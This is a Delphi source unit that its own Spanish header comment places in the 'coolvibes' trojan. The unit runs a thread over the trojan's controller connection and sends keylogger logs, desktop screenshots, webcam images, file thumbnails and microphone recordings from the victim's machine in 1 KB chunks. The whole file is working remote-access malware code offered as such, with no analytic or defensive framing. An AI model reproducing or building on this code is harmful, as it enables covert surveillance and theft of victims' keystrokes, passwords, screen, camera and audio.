{Unit perteniciente al troyano coolvibes que se encarga de gestionar el envio de keylogger, thumbnails,captura de pantalla y de webcam}
unit UnitThreadsCapCamCapture;


interface


uses Windows, SysUtils, SocketUnit, UnitVariables, classes, unitCapScreen, unitfunciones, unitCamScreen, UnitAudio;

type
  TThreadCapCam = class(TThread)
  public
    Server:   TClientSocket;
    Host : string;
    port : string;
    SH : string;
    constructor Create(SHi:integer;Servidor: TClientSocket);
    protected
    procedure Execute; override;
  end;
implementation


constructor TThreadCapCam.Create(SHi:integer;Servidor: TClientSocket);
begin
  inherited Create(true);
  SH     := inttostr(SHi);
  Server := Servidor;
end;

procedure TThreadCapCam.Execute();
var
  Tempstr1, Tempstr2, tempstr, tempstr3, tempstr4, recibido, buffer: string;
  MS : TMemoryStream;
  Enviando : array[0..5] of boolean;
  EnviandoStr : array[0..5] of string;
begin
  FreeOnTerminate := True;
  Enviando[0] := false;
  Enviando[1] := false;
  Enviando[2] := false;
  Enviando[3] := false;
  Enviando[4] := false;

  EnviandoStr[0] := '';
  EnviandoStr[1] := '';
  EnviandoStr[2] := '';
  EnviandoStr[3] := '';
  EnviandoStr[4] := '';

  while (server.Connected) do
  begin
    if pararcapturathread then break;
    if not (Enviando[0] or Enviando[1] or Enviando[2] or Enviando[3] or Enviando[4]) then
    sleep(1);  //Para no saturar la cpu
    
    if ((CapturaKeylogger <> '') or Enviando[4]) then
    begin
      if not Enviando[4] then
      begin
        Enviando[4] := true;
        EnviandoStr[4] := CapturaKeylogger;
        server.SendString('SH|'+ SH + #10 + 'KEYLOGGERLOGSTART|'+inttostr(length(EnviandoStr[4]))+'|'+ #10); //Enviamos el tamaño
      end;

      TempStr := copy(EnviandoStr[4],1,1024); //Bloques de 1 kb
      Delete(EnviandoStr[4], 1, 1024);

      if TempStr <> '' then
      begin
        server.SendString('SH|'+ SH + #10 + 'KEYLOGGERLOGCHUNK|'+inttostr(length(TempStr))+'|'+ #10+TempStr);    //GOGOGO
      end
      else
      begin
        Enviando[4] := false; //Ya hemos terminado
        CapturaKeylogger := '';
      end;
    end;

    if ((CapturaPantalla <> '') or Enviando[0]) then
    begin
      if not Enviando[0] then
      begin
        Recibido := CapturaPantalla;
        TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);//calidad
        Delete(Recibido, 1, Pos('|', Recibido));
        TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //alto
        Delete(Recibido, 1, Pos('|', Recibido));

        MS := TMemoryStream.create;   //MS de la captura de Pantalla
        MS.Position := 0;
        pantallazo(StrToInt(TempStr1),(strtoint(TempStr2) * anchurapantalla )div alturapantalla,strtoint(Tempstr2),GetDesktopWindow(),MS);
        MS.Position := 0;

        SetLength(EnviandoStr[0], ms.size);
        Ms.Read(EnviandoStr[0][1], ms.size);
        MS.Free;
        MS := nil;
         //De paso se manda también la anchura y la altura para poder simular clicks
        server.SendString('SH|'+SH +#10+'CAPSCREENSTART|'+inttostr(AnchuraPantalla)+'¬'+inttostr(AlturaPantalla)+'|' + IntToStr(length(EnviandoStr[0])) + #10);  //mandamos el tamaño

        Enviando[0] := true;
      end;

      TempStr := copy(EnviandoStr[0],1,1024); //Bloques de 1 kb
      Delete(EnviandoStr[0], 1, 1024);

      if TempStr <> '' then
      begin
        server.SendString('SH|'+SH+#10+'CAPSCREENCHUNK|'+inttostr(length(TempStr))+'|'+ #10+TempStr);    //GOGOGO
      end
      else
      begin
        Enviando[0] := false; //Ya hemos terminado
        Capturapantalla := '';
      end;
    end;

    if ((CapturaWebcam <> '') or Enviando[1]) then
    begin
      if not Enviando[1] then
      begin
        server.SendString('SH|'+SH + #10+'CAPTURAWEBCAMSTART|' + inttostr(length(CapturaWebcam)) + #10);  //mandamos el tamaño
        Enviando[1] := true;
        EnviandoStr[1] := CapturaWebcam;
      end;

      TempStr := copy(EnviandoStr[1],1,1024); //Bloques de 1 kb
      Delete(EnviandoStr[1], 1, 1024);
      server.SendString('SH|'+SH+#10+ 'WEBCAMCHUNK|'+inttostr(length(TempStr))+'|'+#10+ TempStr);    //GOGOGO

      if EnviandoStr[1] = '' then
      begin
        Enviando[1] := false;
        CapturaWebcam := '';
      end;
    end;

    if((CapturaThumb <> '') or Enviando[2]) then
    begin
      if not Enviando[2] then
      begin
        Enviando[2] := true;
        Recibido := Trim(CapturaThumb); //filename|width|height|calidad|

        TempStr := copy(recibido, 1, Pos('|', recibido) - 1); //Filename
        Delete(Recibido, 1, pos('|', Recibido));
        TempStr1 := Copy(recibido, 1, pos('|', Recibido) - 1); //width
        Delete(Recibido, 1, pos('|', Recibido));
        TempStr2 := Copy(recibido, 1, pos('|', Recibido) - 1); //height
        Delete(Recibido, 1, pos('|', Recibido));
        TempStr3 := Copy(recibido, 1, pos('|', Recibido) - 1); //calidad
        Delete(Recibido, 1, pos('|', Recibido));
      
        MS := TMemoryStream.create;   //MS de la captura de Pantalla
        MS.Position := 0;
        if Generatethumb(Tempstr, strtoint(Tempstr1), strtoint(Tempstr2), strtoint(Tempstr3),MS) then
        begin
          MS.Position := 0;
          if server.Connected then
          begin
            server.SendString('SH|'+SH+#10+'THUMBNAILSTART|'+inttostr(MS.size)+#10);  //mandamos el tamaño
          end;
          EnviandoStr[2] := '';
          SetLength(EnviandoStr[2], ms.size);
          MS.Read(EnviandoStr[2][1], ms.size);
          MS.Free;
          MS := nil;
        end
        else
        begin   //error al capturar thumb
          Enviando[2] := false; //Ya hemos terminado
          CapturaThumb := '';
          if server.Connected then
            server.SendString('SH|'+SH + #10+'THUMBNAILERROR'+#10);
        end;
      end
      else
      begin

        TempStr := copy(EnviandoStr[2],1,1024); //Bloques de 1 kb
        Delete(EnviandoStr[2], 1, 1024);

        if TempStr <> '' then
        begin
          server.SendString('SH|'+SH+#10+'THUMBNAILCHUNK|'+inttostr(length(TempStr))+'|'+ #10+TempStr);    //GOGOGO
        end
        else
        begin
          Enviando[2] := false; //Ya hemos terminado
          CapturaThumb := '';
        end;
      end;
    end;

    if((CapturaAudio <> '') or Enviando[3])then
    begin
      if not Enviando[3] then
      begin
        Recibido := Trim(CapturaAudio); //segundos|hz-canales-bits|dispositivo|

        TempStr := copy(recibido, 1, Pos('|', recibido) - 1); //segundos
        Delete(Recibido, 1, pos('|', Recibido));
        TempStr1 := Copy(recibido, 1, pos('|', Recibido) - 1); //calidad

        TempStr3 := Copy(TempStr1, 1, pos('-', TempStr1) - 1); //HZ
        Delete(TempStr1, 1, pos('-', TempStr1));
        TempStr4 := Copy(TempStr1, 1, pos('-', TempStr1) - 1); //Canales 1|2
        Delete(TempStr1, 1, pos('-', TempStr1));               //Tempstr1 = bits: 8|16;

        Delete(Recibido, 1, pos('|', Recibido));
        TempStr2 := Copy(recibido, 1, pos('|', Recibido) - 1); //dispositivo
        Delete(Recibido, 1, pos('|', Recibido));
        buffer := '';

        GrabaAudio(strtointdef(tempstr2,0){Dispositivo},
                  strtointdef(tempstr,1){Duracion en segundos},
                  strtointdef(tempstr3,11025),
                  strtointdef(tempstr1,8){bits},
                  strtointdef(tempstr4,1){mono|stereo},
                  EnviandoStr[3]{buffer});
        server.SendString('SH|'+SH+#10+'AUDIOSTART|'+inttostr(length(EnviandoStr[3]))+'|'+ #10);
        Enviando[3] := true;
      end;

        TempStr := copy(EnviandoStr[3],1,1024); //Bloques de 1 kb
        Delete(EnviandoStr[3], 1, 1024);

        if TempStr <> '' then
        begin
          server.SendString('SH|'+SH+#10+'AUDIOCHUNK|'+inttostr(length(TempStr))+'|'+ #10+TempStr);    //GOGOGO
        end
        else
        begin
          Enviando[3] := false; //Ya hemos terminado
          CapturaAudio := '';
        end;
    end;
  end;
  Pararcapturathread := true;
  ExitThread(0);
end;

end.

